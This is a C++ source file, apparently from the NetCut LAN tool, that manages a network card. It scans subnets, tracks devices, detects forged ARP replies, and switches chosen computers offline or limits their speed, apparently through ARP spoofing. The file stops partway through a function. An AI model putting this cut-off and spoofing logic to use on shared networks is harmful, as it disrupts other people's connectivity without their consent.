/*
 * CnetCard.cpp
 *
 *  Created on: Jun 12, 2014
 *      Author: victor
 */

#include "CnetCard.h"
#include <string>
#include <sstream>

#include <sstream>

namespace patch {
template<typename T> std::string to_string(const T& n) {
	std::ostringstream stm;
	stm << n;
	return stm.str();
}
}

/*
 DWORD CnetCard::m_nMyFakeIP;
 char CnetCard::m_sMyMac[6];
 char CnetCard::m_sGateMac[6];
 */

CnetCard::CnetCard() {

	initNetCard();

}

CnetCard::CnetCard(const CnetCard& other) {
	initNetCard();
	(*this) = other;
}

CnetCard& CnetCard::operator=(const CnetCard& other) {

	this->m_bUp = other.m_bUp;
	this->m_bWorkOn = other.m_bWorkOn;

	memcpy(&m_sMac, &other.m_sMac, sizeof(m_sMac));
	//IP地址列表类
	//计算机列表类

	return *this;
}
/*
 void CnetCard::TestConnection() {

 this->m_lock.lock();
 libnet_t * LibnetHandle = this->InitSendAdapter();

 do {

 if (m_ConnectTest.nNextAction == this->TEST_ACTION::DIRECTTEST) {
 m_ConnectTest.nSrcIP = this->GetMyIP();
 } else {
 m_ConnectTest.nSrcIP = this->GetTakeIP();
 }
 m_ConnectTest.nACKNumber = CAddressHelper::GetRandomIP();

 int tcp = libnet_build_tcp(CAddressHelper::GetRandomIP(), // source port
 m_ConnectTest.nport,  // destination port
 m_ConnectTest.nACKNumber,               // sequence number
 0,              // acknowledgement number
 TH_SYN,                  // control bits
 29200,                   // Advertised window size
 0,                       // checksum
 0,                       // urgent pointer
 LIBNET_TCP_H,       // length ofprotocol header
 NULL,           // data
 0,         // payload length
 LibnetHandle, 0);
 if (tcp == -1) {
 TRACE("Unable to build TCP header.\n");
 break;
 }

 m_ConnectTest.nACKNumber++;

 int ip = libnet_build_ipv4(LIBNET_IPV4_H + LIBNET_TCP_H, // length
 0x10,        // TOS
 0,   // IP ID
 0,   // IP Frag
 16,  // TTL
 IPPROTO_TCP, // protocol
 0,   // checksum
 m_ConnectTest.nSrcIP,        // src ip
 m_ConnectTest.nIP,        // destination ip
 NULL,        // payload
 0,   // payload size
 LibnetHandle,    // libnet handle
 0);  // libnet id

 if (ip == -1) {
 TRACE("Unable to build IP header.\n");
 break;
 }

 int t = libnet_autobuild_ethernet(this->m_MACGateMac.data(), // ethernet destination
 ETHERTYPE_IP, // protocol type
 LibnetHandle);        // libnet handle

 if (t == -1) {
 TRACE("libnet_build_ethernet err!\n");
 break;

 }

 int c = libnet_write(LibnetHandle);
 if (c == -1) {
 TRACE("Unable to Write \n");
 break;
 }

 m_ConnectTest.nPacketTimeStampe = _helper_GetMiTime();

 } while (false);

 ClearSendAdapter(LibnetHandle);

 this->m_lock.unlock();
 }
 */

void CnetCard::initNetCard() {
	//pthread_mutex_init(&this->m_lock, NULL);
	//pthread_mutex_init(&this->m_lockIO, NULL);

	memset(&m_ConnectTest, 0, sizeof(m_ConnectTest));
	m_nDefaultGateWayIP = 0;
	m_nLastLibNetWriteTime = 0;
	m_nLastDisCoverNetworkTime = 0;
	m_nLastStatusTime = 0;

	m_bIPFORWARDSystemValue = GetIpforward();
	m_nLastBeenAttackTime = 0;
	m_nTakeIP = 0;
	m_bProtection = true;
	m_nCutoffMethod = NETCUTTYPE_CUTOFFMETHOD_BOTH
	;
	m_bConnectMe = false;
	this->m_bUp = false;
	m_bRunAsRoot = true;

	bzero(this->m_sMac, 6);

	m_bWorkOn = false;

	LoadBlackList();
	LoadGroundedSetting();
	LoadMacNodeNames();
	LoadCutOffMethod();

}

int CnetCard::GetConnectMeStatus() {

	m_lock.lock();

	ConnectMeStatus c = this->m_nConnectMeRequest;
	m_lock.unlock();

	return c;
}
/*

 void CnetCard::SetConnectMe(ConnectMeStatus p_nConnectMe) {
 m_lock.lock();

 this->m_nConnectMeRequest = p_nConnectMe;
 if (ConnectMeStatus::STOP == m_nConnectMeRequest) {
 this->CleanNAT();
 }

 m_lock.unlock();

 this->UpdateClients(NETCARDEVENT_CONNECTMEINFO, m_nConnectMeRequest);

 }

 */

void CnetCard::SetProtection(bool p_bOn) {
	m_lock.lock();

	this->m_bProtection = p_bOn;
	/*
	 if (!m_bProtection)
	 CleanNAT();
	 */

	if (this->m_computers.count(this->m_MACADD)) {
		m_computers[m_MACADD].FlagAsNetCutDefender(m_bProtection);
		this->OnComputerUpdate(m_computers[m_MACADD]);
	}
	m_lock.unlock();

	this->UpdateClients(IPCMESSAGE_ID_INT_SETDEFENDER, m_bProtection);

}

std::string CnetCard::getDevName() {
	m_lock.lock();
	std::string s = this->m_sDevName;

	m_lock.unlock();
	return s;
}
string CnetCard::GetMyMac() {

	m_lock.lock();

	string s = CAddressHelper::BufferMac2str(this->m_sMac);

	m_lock.unlock();
	return s;

}

string CnetCard::GetMyGateMac() {

	m_lock.lock();
	string s = CAddressHelper::BufferMac2str(m_MACGateMac.data());
	m_lock.unlock();
	return s;

}
string CnetCard::GetAllUserMac() {

	m_lock.lock();

	string s = "";

	std::map<MACADDR, CComputer>::iterator it;
	for (it = m_computers.begin(); it != m_computers.end(); ++it) {
		//	MACADDR &m = (*it).first;
		CComputer & c = (*it).second;
		if (c.GetAgeRate() == 0) {
			s += c.GetMacStr();
			s += " ";
		}
	}

	m_lock.unlock();
	return s;

}

bool CnetCard::IsMyMac(const MACADDR & p_Mac) {

	bool bIsGatePacket = false;
	m_lock.lock();

	if (m_MACADD == p_Mac)
		bIsGatePacket = true;

	m_lock.unlock();

	return bIsGatePacket;
}
bool CnetCard::IsGateWayMac(const MACADDR & p_Mac) {

	bool bIsGatePacket = false;
	m_lock.lock();

//	bIsGatePacket = m_Gateways.count(p_Mac);
	if (this->m_computers.count(p_Mac) && m_computers[p_Mac].IsGateway())
		bIsGatePacket = true;

	m_lock.unlock();

	return bIsGatePacket;
}

bool CnetCard::IsGateWayPacket(const MACADDR & p_Mac, DWORD p_nIP) {
	bool bIsGatePacket = false;
	m_lock.lock();

	if (this->m_computers.count(p_Mac) && m_computers[p_Mac].IsGateway()
			&& m_computers[p_Mac].IsMyIP(p_nIP))
		bIsGatePacket = true;

	/*	if (m_Gateways.count(p_Mac) && m_Gateways[p_Mac].IsMyIP(p_nIP))
	 bIsGatePacket = true;
	 */
	m_lock.unlock();

	return bIsGatePacket;

}

bool CnetCard::IsMyGateIP(const DWORD &p_nNewIP) {
	bool bFound = false;

	m_lock.lock();

	do {
		if (m_GatewayIPMap.find(p_nNewIP) != m_GatewayIPMap.end()) {
			bFound = true;
			break;
		}
		std::map<MACADDR, CComputer> Gates;

		this->GetMyGate(Gates);

		std::map<MACADDR, CComputer>::iterator it;

		for (it = Gates.begin(); it != Gates.end(); ++it) {
			CComputer &computer = (*it).second;

			if (computer.IsMyIP(p_nNewIP)) {
				bFound = true;
				break;

			}

		}

	} while (false);

	m_lock.unlock();

	return bFound;

}

bool CnetCard::IsMyIP(const DWORD &p_nNewIP) {

	m_lock.lock();

	bool bMyIP = false;
	if (this->m_IPs.count(p_nNewIP) || this->m_nTakeIP == p_nNewIP)
		bMyIP = true;

	m_lock.unlock();
	return bMyIP;

}
bool CnetCard::IsMyNetwork(const DWORD &p_nIP) {

	bool bSameNetwork = false;
	m_lock.lock();

	for (std::map<DWORD, Address>::iterator it = m_IPs.begin();
			it != m_IPs.end(); ++it) {
		Address& s = (*it).second;

		if (CAddressHelper::isSameRang(p_nIP, s.Ip, s.Mask)) {
			bSameNetwork = true;
			break;
		}

	}

	m_lock.unlock();
	return bSameNetwork;

}

bool CnetCard::IsMacOff(u_char * p_sBuf) {

	MACADDR mac = CAddressHelper::MacBuffer2Array(p_sBuf);

	m_lock.lock();
	bool bIsOff = false;

	do {
		if (this->m_computers.count(mac))
			bIsOff = m_computers[mac].IsOff();
	} while (false);
	m_lock.unlock();
	return bIsOff;

}
/*
 bool CnetCard::IsIPOff(DWORD p_nIP) {

 m_lock.lock();
 bool bIsOff = false;
 do {
 if (!this->m_computers.count(p_nIP))
 break;
 bIsOff = m_computers[p_nIP].IsOff();
 } while (false);
 m_lock.unlock();
 return bIsOff;
 }
 */

bool CnetCard::IsUp() {

	m_lock.lock();
	bool bIsup = this->m_bUp;
	m_lock.unlock();
	return bIsup;

}

bool CnetCard::GetIsRoot() {
	bool bRet;
	m_lock.lock();
	/*	TRACE("Get test handle\n");
	 libnet_t * handle = this->InitSendAdapter();

	 m_bRunAsRoot =(handle!=NULL);

	 if(handle!=NULL)
	 {
	 TRACE("Destory test handle\n");
	 libnet_destroy(handle);
	 TRACE("Destory test handle done\n");
	 }
	 */
	m_bRunAsRoot = CAddressHelper::IsRunningAsRoot();
	bRet = m_bRunAsRoot;
	m_lock.unlock();
	return bRet;
}

bool CnetCard::GetIsSlowSCan() {

	bool bRet = false;
	m_lock.lock();
	/*libnet_t * handle = this->InitSendAdapter();
	 m_bRunAsRoot =(handle!=NULL);

	 if(handle!=NULL)
	 libnet_destroy(handle);
	 */
	bRet = m_bSlowScan;

	m_lock.unlock();
	return bRet;
}

void CnetCard::setDevName(const string &p_sName, const u_char * p_macBuf) {
	// TODO Auto-generated constructor stub

	m_lock.lock();

	this->SetDeviceName(p_sName);
	this->SetDevName(p_sName);
	this->m_sDevName = p_sName;
	memcpy(m_sMac, p_macBuf, 6);
	m_MACADD = CAddressHelper::MacBuffer2Array(m_sMac);

	this->m_sMacString = _helper_Mac_buff2Str(&m_sMac[0]);

	char acHostname[255];
	bzero(acHostname, 255);
	gethostname(acHostname, 255);
	this->m_sHostname = acHostname;

	this->AddMac2Name(m_MACADD, this->m_sHostname);

	hostent * record = gethostbyname(CONNECTIONTESTHOSTNAME);
	if (record != NULL) {
		in_addr * address = (in_addr *) record->h_addr;
		m_ConnectTest.nIP=address->s_addr;
		m_ConnectTest.nport=80;
	}
	else
	m_ConnectTest.nNextAction=this->TEST_ACTION::NOMORETEST;

	m_lock.unlock();

}

CnetCard::~CnetCard() {

	/* test crash */

	m_EventsQuit.SetEvent();

	m_DiscoverFinnalArray.shutdown();
	TRACE("array shutdown\n");
//Test crash */

	m_OnOffworkerThread.WaitThreadExit();
//	TRACE("on off worker dones\n");
	m_InfoworkerThread.WaitThreadExit();
//	TRACE("info done\n");
	m_GroundThread.WaitThreadExit();
//	TRACE("Ground done\n");
	m_MakeSureMeLiveThread.WaitThreadExit();
//	TRACE("Live done\n");
	m_ConnectMeThread.WaitThreadExit();
//	TRACE("Connect me done\n");
	m_ArpCacheReaderThread.WaitThreadExit();
//	TRACE("Arp watch done\n");

	ClearAllComputer();
//	TRACE("Remove all User done\n");

}

void CnetCard::AddmyIPAddress(Address& p_newIP) {

	m_lock.lock();
	if (!m_IPs.count(p_newIP.Ip)) {
		m_IPs[p_newIP.Ip] = p_newIP;
		m_nMyIP = p_newIP.Ip;
		m_nMask = p_newIP.Mask;

		DemandDisCoverNetwork();
	}

	m_lock.unlock();

}

void CnetCard::SetMac2GateWay(const MACADDR & p_Addr) {
	m_lock.lock();
	if (this->m_computers.count(p_Addr)) {

		//	m_Gateways[p_Addr] = m_computers[p_Addr];

		m_computers[p_Addr].SetGateWay(true);
		this->OnComputerUpdate(m_computers[p_Addr]);
	}
	m_lock.unlock();
}

/*
 void CnetCard::SetIP2GateWay(DWORD &p_nIP) {
 m_lock.lock();
 if (this->m_computers.count(p_nIP)) {
 Address newGate;
 newGate.Ip = p_nIP;
 newGate.bHasMac = true;
 m_computers[p_nIP].GetMac(newGate.buff);
 newGate.computername = m_computers[p_nIP].GetName();

 m_Gateways[p_nIP] = newGate;
 }
 m_lock.unlock();
 }
 */

void CnetCard::RemoveMac2GateWay(MACADDR & p_Addr) {
	m_lock.lock();

	if (this->m_computers.count(p_Addr)) {
		m_computers[p_Addr].SetGateWay(false);
		this->OnComputerUpdate(m_computers[p_Addr]);
	}

	m_lock.unlock();

}
void CnetCard::AddmyGateWay(int32_t p_nGate) {

	m_lock.lock();

	m_GatewayIPMap[p_nGate] = p_nGate;

//	TRACE("Set Gateway %s\n", CAddressHelper::IntIP2str(p_newGate.Ip).c_str());

	std::map<MACADDR, CComputer>::iterator it;

	for (it = m_computers.begin(); it != m_computers.end(); ++it) {
		CComputer &computer = (*it).second;

		if (computer.IsMyIP(p_nGate)) {

			this->SetMac2GateWay(computer.GetMacArray());
			break;

		}

	}

	m_lock.unlock();

}

DWORD CnetCard::GetMyIP() {

	DWORD nIP = 0;
	m_lock.lock();

	for (std::map<DWORD, Address>::iterator it = m_IPs.begin();
			it != m_IPs.end(); ++it) {
		Address& s = (*it).second;
		nIP = s.Ip;
		break;
	}

	m_lock.unlock();

	return nIP;
}

DWORD CnetCard::GetMyMask() {

	DWORD nIP;
	m_lock.lock();

	for (std::map<DWORD, Address>::iterator it = m_IPs.begin();
			it != m_IPs.end(); ++it) {
		Address& s = (*it).second;
		nIP = s.Mask;
		break;
	}

	m_lock.unlock();

	return nIP;
}

void CnetCard::GetMyIP(std::map<DWORD, Address>& p_IPs) {

	m_lock.lock();
	p_IPs = m_IPs;
	m_lock.unlock();
}
void CnetCard::GetMyGate(std::map<MACADDR, CComputer>& p_Gates) {

	m_lock.lock();
//	p_Gates = m_Gateways;

	std::map<MACADDR, CComputer>::iterator it;

	for (it = this->m_computers.begin(); it != m_computers.end(); ++it) {
		CComputer &computer = (*it).second;

		if (computer.IsGateway()) {

			p_Gates[computer.GetMacArray()] = computer;

		}

	}

	m_lock.unlock();

}

void CnetCard::Off2On() {

	m_lock.lock();

	this->m_bUp = true;

//	DiscoverNetwork();     当网络状态从不在线到在线状态的时候,启动该网络的发现网络进程. 取消此项，因为当网络从不在线到在线的过程中，总是会获得新的IP地址的

	if (!m_bWorkOn) {
		m_bWorkOn = true;
		if (m_bRunAsRoot) {

			StartSniff();
			m_OnOffworkerThread.StartThread(threadMakeSureOnOffWorker, this);

			m_MakeSureMeLiveThread.StartThread(threadMakeSureMeLive, this);
		}

		m_ArpCacheReaderThread.StartThread(threadArpCacheReader, this);
		m_InfoworkerThread.StartThread(threadComputerInfoWorker, this);

		m_GroundThread.StartThread(threadGroundedWorker, this);

	}

	m_lock.unlock();

	ShowALLComputers();
}

bool CnetCard::GetIsBeenAttack() {
	m_lock.lock();
	bool b =
			(_helper_GetMiTime() - this->m_nLastBeenAttackTime)
					> TIMEOUT_OVERCOME_ATTACK ? false : true;
	m_lock.unlock();

	return b;
}
void CnetCard::SetAttack() {

	m_lock.lock();

	if (_helper_GetMiTime() - m_nLastBeenAttackTime > TIMEOUT_OVERCOME_ATTACK) {
		TRACE("Someone attack me\n");
	}

	this->m_nLastBeenAttackTime = _helper_GetMiTime();

	m_lock.unlock();

}
DWORD CnetCard::GetNextAvaiableIP(DWORD & p_nIP) {
	m_lock.lock();
	int countN = 0;
	DWORD n = CAddressHelper::GetNextIP(p_nIP);
	while (this->IsKnownIP(n)) {
		n = CAddressHelper::GetNextIP(p_nIP);
		if (countN++ > 3)
			break;
	}

	m_lock.unlock();

	return n;
}

CComputer * CnetCard::GetComputerByIP(const DWORD &p_nIP) {

	m_lock.lock();
	CComputer * pComputer = NULL;
	std::map<MACADDR, CComputer>::iterator it;

	for (it = m_computers.begin(); it != m_computers.end(); ++it) {
		CComputer &computer = (*it).second;

		if (computer.IsMyIP(p_nIP)) {
			pComputer = &computer;
			break;

		}
	}

	m_lock.unlock();
	return pComputer;
}
bool CnetCard::IsNewRangeIP(const DWORD &p_nIP) {

	m_lock.lock();

	std::map<MACADDR, CComputer>::iterator it;
	bool bFound = true;

	for (it = m_computers.begin(); it != m_computers.end(); ++it) {
		CComputer &computer = (*it).second;

		if (!computer.IsMyIP(p_nIP) && computer.IsSameRange(p_nIP)) {
			bFound = false;
			break;

		}

	}
	m_lock.unlock();
	return bFound;

}
bool CnetCard::IsKnownNode(const u_char * p_sbuf, const DWORD &p_nIP) {

	m_lock.lock();

	MACADDR macarry = CAddressHelper::MacBuffer2Array(p_sbuf);
	bool bFound = IsKnownNode(macarry, p_nIP);

	m_lock.unlock();
	return bFound;

}

bool CnetCard::IsKnownNode(const MACADDR & macarray, const DWORD &p_nIP) {

	m_lock.lock();

	bool bFound = false;

	if (m_computers.count(macarray) && m_computers[macarray].IsMyIP(p_nIP))
		bFound = true;

	m_lock.unlock();
	return bFound;

}

bool CnetCard::IsKnownNode(const CPacketBase &p_Packet) {

	m_lock.lock();

	bool bFound = false;

	if (p_Packet.m_nType != p_Packet.PacketTYPE::ARP) {
		bFound = IsKnownNode(p_Packet.m_EtherSrc, p_Packet.m_nIPSrc);
	}

	if (p_Packet.m_nType == p_Packet.PacketTYPE::ARP) {
		bFound = IsKnownNode(p_Packet.m_EtherSrc, p_Packet.m_nARPSrcIP);
	}

	m_lock.unlock();
	return bFound;

}
bool CnetCard::IsKnownIP(const DWORD &p_nIP) {

	m_lock.lock();

	std::map<MACADDR, CComputer>::iterator it;
	bool bFound = false;

	for (it = m_computers.begin(); it != m_computers.end(); ++it) {
		CComputer &computer = (*it).second;

		if (computer.IsMyIP(p_nIP)) {
			bFound = true;
			break;

		}

	}
	m_lock.unlock();
	return bFound;

}

void CnetCard::OnClientMessage(const CIPCMessage * p_Message) {

	m_lock.lock();

	switch (p_Message->TypeID()) {
	case NETCARDEVENT_SCANNETWORK: {

		DemandDisCoverNetwork();

		break;
	}
	case IPCMESSAGE_ID_GROUNDSETTING: {

		CIPCMessageGroundSetting *p = (CIPCMessageGroundSetting *) p_Message;
		MACADDR mac = CAddressHelper::MacBuffer2Array(
				(u_char *) p->m_message.MacBuff);

		if (this->m_computers.count(mac)) {
			m_computers[mac].SetGround(p->m_message.gDaily);
			m_computers[mac].SetGround(p->m_message.gOneTime);
			SaveGroundedSetting();
			OnComputerUpdate(m_computers[mac]);
		}

		break;
	}
	default: {
		break;
	}
	}

	m_lock.unlock();

}

void CnetCard::OnClientEvent(const netcardClientEvent * p_nEvent) {

	m_lock.lock();
	MACADDR mac = CAddressHelper::MacBuffer2Array((u_char *) p_nEvent->sMac);

	switch (p_nEvent->nEventType) {
	case NETCARDEVENT_SCANNETWORK: {
		ClearAllComputer();
		DemandDisCoverNetwork();

		break;
	}
	case NETCARDEVENT_SET_NODE_NAME: {

		string sName(p_nEvent->sName, p_nEvent->nHostNameSize);

		FixMac2Name(mac, sName);

		break;
	}
	case NETCARDEVENT_GROUNDINFO: {

		GroundUnit n;
		memset(&n, 0, sizeof(n));
		memcpy(&n, p_nEvent->sName, sizeof(GroundUnit));
		if (this->m_computers.count(mac)) {
			m_computers[mac].SetGround(n);
			SaveGroundedSetting();
			//OnComputerGroundedUpdate(m_computers[mac]);
			OnComputerUpdate(m_computers[mac]);
		}

		break;
	}
	default: {
		break;
	}
	}

	m_lock.unlock();

}

void CnetCard::GetIPsofMac(u_char *p_sBuf, std::map<DWORD, bool> &p_Ips) {
	MACADDR mac = CAddressHelper::MacBuffer2Array(p_sBuf);

	m_lock.lock();

	do {

		if (m_computers.count(mac)) {
			m_computers[mac].GetIPs(p_Ips);

		}

	} while (false);

	m_lock.unlock();
}

void CnetCard::SetComputerSpeed(u_char * p_sMacBuf, int p_nLimit) {

	MACADDR mac = CAddressHelper::MacBuffer2Array(p_sMacBuf);

	m_lock.lock();

	do {

		if (m_computers.count(mac)) {
			m_computers[mac].SetSpeedLimit(p_nLimit);

			this->MakeSureOffOn(m_computers[mac]);

			//OnComputerUpdate(m_computers[mac]);
		}

	} while (false);

	m_lock.unlock();

	SaveBlackList();

}

void CnetCard::SetComputerOnOff(u_char * p_sMacBuf, bool p_bOff) {
	MACADDR mac = CAddressHelper::MacBuffer2Array(p_sMacBuf);

	m_lock.lock();

	do {

		if (m_computers.count(mac)) {
			{
				string sOnOff = p_bOff ? " OFFLINE" : " ONLINE";
				string sStatus = "Setting " + m_computers[mac].GetIPs()
						+ sOnOff;
				this->UpdateStatus(sStatus);
				SetComputerOnOff(m_computers[mac], p_bOff);

				::msleep(1500);
				string sStatus2 = "Done " + sStatus;
				this->UpdateStatus(sStatus2);
			}
			if (!p_bOff)
				RemoveFromBlacklist(m_computers[mac]);

			break; //If it is a MAC match, then it's good enough , no need to check further
		}

	} while (false);

	m_lock.unlock();

	SaveBlackList();
}

void CnetCard::SetComputerOnOff(const netcardClientEvent * p_nEvent) {
	//if there is one match on Mac,IP,name already, then stop, else, match on Mac and IP only,  if yes, stop, otherwise, match on Mac only, if yes, stop, otherwise match on name only, if yes, stop, otherwise match on IP.
	m_lock.lock();

	MACADDR mac = CAddressHelper::MacBuffer2Array((u_char *) p_nEvent->sMac);

	std::map<MACADDR, CComputer>::iterator it;

	do {

		if (m_computers.count(mac)) {
			SetComputerOnOff(m_computers[mac], p_nEvent->bOff);

			if (!p_nEvent->bOff)
				RemoveFromBlacklist(m_computers[mac]);

			break; //If it is a MAC match, then it's good enough , no need to check further
		}

	} while (false);

	m_lock.unlock();

	SaveBlackList();
}

void CnetCard::DiscoverNetwork() {

	m_lock.lock();

	unsigned long nDelay = _helper_GetMiTime()
			- this->m_nLastDisCoverNetworkTime;
	if (nDelay > 1000 * 5) {

		for (std::map<DWORD, DWORD>::iterator it = this->m_GatewayIPMap.begin();
				it != m_GatewayIPMap.end(); ++it) {
			DWORD& s = (*it).second;

			DiscoverTask d;
			d.bSingleIP = true;
			d.bNoIPQuery = false;
			d.MAC = CAddressHelper::GetBrocastMac();
			d.nIP = s;
			m_DiscoverFinnalArray.AddTail(d);
		}

		SendMDNSQuery("_mobileremote._tcp.local", T_PTR, this->GetMyIP());
		SendMDNSQuery("_airplay._tcp.local", T_PTR, GetMyIP());
		SendMDNSQuery("_googlecast._tcp.local", T_PTR, GetMyIP());
		SendMDNSQuery("_workstation._tcp.local", T_PTR, GetMyIP());

		std::map<DWORD, Address> ips;
		this->GetMyIP(ips);

		for (std::map<DWORD, Address>::iterator it = ips.begin();
				it != ips.end(); ++it) {
			Address& s = (*it).second;
			AddDisCoverIP(s.Ip);
		}

		std::map<MACADDR, CComputer>::iterator computerit;

		for (computerit = m_computers.begin(); computerit != m_computers.end();
				++computerit) {
			CComputer &computer = (*computerit).second;

			std::map<DWORD, bool> ips;
			computer.GetIPs(ips);

			map<DWORD, bool>::iterator ipit;

			for (ipit = ips.begin(); ipit != ips.end(); ++ipit) {

				DWORD ip = (*ipit).first;
				this->AddDisCoverIP(ip);

			}
		}
		this->SendDiscover();

		m_nLastDisCoverNetworkTime = _helper_GetMiTime();
	}
	m_lock.unlock();

}

void CnetCard::DiscoverNetwork(const DWORD& p_nIP) {

	int nRetry = 3;
	if (!IsUp())
		return;

	do {

		DWORD n1, n2, n3;

		CAddressHelper::GetIpRang(p_nIP, CAddressHelper::cmask, n1, n2);

		if (m_queryNetworkHistory.count(n1)) {
			unsigned long nUpdateTime = _helper_GetMiTime()
					- m_queryNetworkHistory[n1].nUpdateTime;

			if (nUpdateTime < 12 * 1000)
				break; //I recently queried this in less than 255*100/1000*0.8 seconds
		}

		TRACE("Trying discover range %s %s \n",
				CAddressHelper::IntIP2str(n1).c_str(),
				CAddressHelper::IntIP2str(n2).c_str());

		DWORD nTotal = CAddressHelper::GetTotalIPNumber(n1, n2);
		nTotal *= nRetry;
		n3 = n1;
		DWORD nCount = 0;
		for (int i = 0; i < nRetry; i++) {
			n1 = n3;

			while (n1 != n2) {
				nCount++;
				n1 = CAddressHelper::GetNextIP(n1);

				DWORD nProgress = nCount * 100 / nTotal;
				string sStatus = "Scanning " + CAddressHelper::IntIP2str(n3)
						+ "-" + CAddressHelper::IntIP2str(n2) + " "
						+ patch::to_string(nProgress) + "% Done";
				this->UpdateStatus(sStatus);

				/*	if (this->IsKnownIP(n1))
				 continue;
				 if (!this->ArpQueryIP(n1)) {
				 msleep(50);
				 this->ArpQueryIP(n1);
				 }
				 */

				QueryIP(n1);

				if (this->m_EventsQuit.WaitForEvent(1 * 10))
					return;
				msleep(5);
			}
			msleep(300);
		}
		msleep(1000);

		string sStatus = "Scan " + CAddressHelper::IntIP2str(n3) + "-"
				+ CAddressHelper::IntIP2str(n2) + " 100% Done";
		this->UpdateStatus(sStatus);

		m_queryNetworkHistory[n3].Ip = n1;
		m_queryNetworkHistory[n3].nUpdateTime = _helper_GetMiTime();
		msleep(1000);

	} while (false);

}

void CnetCard::AddDisCoverIP(const DWORD & p_nIP) {

	m_lock.lock();

	list<DWORD>::iterator networkit;
	bool bNeed = true;
	for (networkit = this->m_DiscoverWorkList.begin();
			networkit != m_DiscoverWorkList.end(); ++networkit) {
		DWORD network = *networkit;
		if (CAddressHelper::isSameRang(p_nIP, network, CAddressHelper::cmask)) {
			bNeed = false;
			break;
		}
	}
	if (bNeed)
		m_DiscoverWorkList.push_back(p_nIP);

	m_lock.unlock();

}
void CnetCard::SendDiscover() {

	m_lock.lock();

	while (m_DiscoverWorkList.size() > 0) {
		DWORD n = m_DiscoverWorkList.front();
		m_DiscoverWorkList.pop_front();
		DiscoverTask d;
		d.nIP = n;
		d.bSingleIP = false;
		d.bNoIPQuery = false;
		d.MAC = CAddressHelper::GetBrocastMac();
		this->m_DiscoverFinnalArray.AddTail(d);

	}
	m_lock.unlock();

}

void CnetCard::AddIP2Query(const CPacketBase & p_Packet) {

	m_lock.lock();

	do {
		DiscoverTask d;
		d.bSingleIP = true;
		d.bNoIPQuery = false;
		if (p_Packet.m_nType == p_Packet.PacketTYPE::ARP) {
			if (p_Packet.m_nARPSrcIP == 0)
				break;
			d.nIP = p_Packet.m_nARPSrcIP;
			d.MAC = p_Packet.m_ARPSrcMac;
		} else {
			d.nIP = p_Packet.m_nIPSrc;
			d.MAC = p_Packet.m_EtherSrc;
		}

		if (this->IsKnownNode(d.MAC, d.nIP))
			break;

		m_DiscoverFinnalArray.AddTail(d);
	} while (false);

	m_lock.unlock();

}

void CnetCard::showDetails() {

	m_lock.lock();

	/*
	 for (std::map<DWORD,Address>::iterator it = m_IPs.begin(); it != m_IPs.end();
	 ++it) {
	 //	Address s=(*it).second;

	 //TRACE("Name %s\n",this->m_sDevName.c_str());
	 //TRACE("Mac %s\n",this->m_sMacString.c_str());

	 }
	 */

	m_lock.unlock();

}

void CnetCard::ShowALLComputers() {

	/*if (!this->m_bUp) {
	 this->UpdateClients(NETCARDEVENT_NETWORKDOWN, true);
	 }
	 */

	this->UpdateClients(NETCARDEVENT_DEFENDERINFO, m_bProtection);
	ShowCutMethod();
	MessageINT_Value(IPCMESSAGE_ID_INT_SLOWSCAN, (int) m_bSlowScan);
	MessageINT_Value(IPCMESSAGE_ID_INT_FAKEMAC, (int) m_bFakeMac);

//	this->UpdateClients(NETCARDEVENT_CONNECTMEINFO, m_bConnectMe);

	std::map<MACADDR, CComputer>::iterator it;
	for (it = m_computers.begin(); it != m_computers.end(); ++it) {
		CComputer &computer = (*it).second;
		/*		TRACE("%s %s %s %s\n", computer.GetIPs().c_str(),
		 computer.GetMacStr().c_str(), computer.GetBrand().c_str(),
		 computer.GetName().c_str());
		 */
		this->OnComputerUpdate(computer);
	}

}

void CnetCard::NewComputerProcess(const CPacketBase & packet) {

	m_lock.lock();

	/*	TRACE("Get ARP %s packet from %s %s to %s %s\n",packet.m_nARPOP == ARPOP_REPLY?"Reply":"Request",
	 CAddressHelper::IntIP2str(packet.m_nARPSrcIP).c_str(),CAddressHelper::BufferMac2str(packet.m_pEthernet->ether_shost).c_str(),
	 CAddressHelper::IntIP2str(packet.m_nARPDstIP).c_str(),CAddressHelper::BufferMac2str(packet.m_pEthernet->ether_dhost).c_str());
	 */
	do {

		if (packet.m_nARPOP == ARPOP_REPLY
				&& this->m_queryHistory.count(packet.m_nARPSrcIP)) {

			if ((memcmp(CAddressHelper::m_macBrocast,
					m_queryHistory[packet.m_nARPSrcIP].buff, 6) == 0)
					|| memcmp(packet.m_pEthernet->ether_shost,
							m_queryHistory[packet.m_nARPSrcIP].buff, 6) == 0) {
				m_queryHistory.erase(packet.m_nARPSrcIP);
				this->AddnewComputer(packet.m_EtherSrc, packet.m_nARPSrcIP);
				break; //done add new computer
			}

		}

		AddIP2Query(packet);
		/*  this->ArpQueryIP(packet.m_nARPSrcIP,
		 (u_char *) packet.m_pEthernet->ether_shost);
		 */
	} while (false);

	m_lock.unlock();
}

void CnetCard::DetectNetcutDefender(const CPacketBase & packet) {

	if (CAddressHelper::isBrocastMAC(packet.m_EtherDST.data())) {
		string s = CAddressHelper::BufferMac2str(packet.m_EtherSrc.data());
		DWORD compareIP = CAddressHelper::MakeNetcutSignIP(s);

		if (compareIP == packet.m_nARPDstIP
				&& this->m_computers.count(packet.m_EtherSrc)) {
			m_computers[packet.m_EtherSrc].FlagAsNetCutDefender();
			this->OnComputerUpdate(m_computers[packet.m_EtherSrc]);
		}

	}

}

void CnetCard::DefenderProcess(const CPacketBase & packet) {
	/*
	 *
	 * If someone attack me, I will nuke him off
	 * if the target IP is one of my IP or take IP, and src IP is gateway, but src mac is not gateway
	 * Got it's sender MAC, find it's computer, flag it to attacker, set it to off
	 * Send query to Gateway for myself
	 */
	m_lock.lock();
	if (this->m_computers.count(m_MACADD)
			&& this->m_computers.count(packet.m_EtherSrc)) { //Make sure I have my own computer info already
			/*	if(m_computers[packet.m_EtherSrc].GetIPs()=="192.168.1.122") */

		if (this->IsMyIP(packet.m_nARPDstIP)
				&& this->IsMyGateIP(packet.m_nARPSrcIP)
				&& !this->IsGateWayMac(packet.m_ARPSrcMac)) {

			//TRACE("Someone attack me %s\n");
			if (this->m_computers.count(packet.m_EtherSrc)) {
				m_computers[packet.m_EtherSrc].FlagAsAttacker();
				//	SetComputerOnOff(m_computers[packet.m_EtherSrc], true);
				//	this->MakeSureOffOn(m_computers[packet.m_EtherSrc]);

			}

			this->MakeSureOffOn(m_computers[m_MACADD]);
			SetAttack();

		}
	}
	m_lock.unlock();
}
void CnetCard::ReplyQuery(const CPacketBase & packet, CComputer * p_Computer) {

	u_char mymac[6];
	this->getMac(mymac);
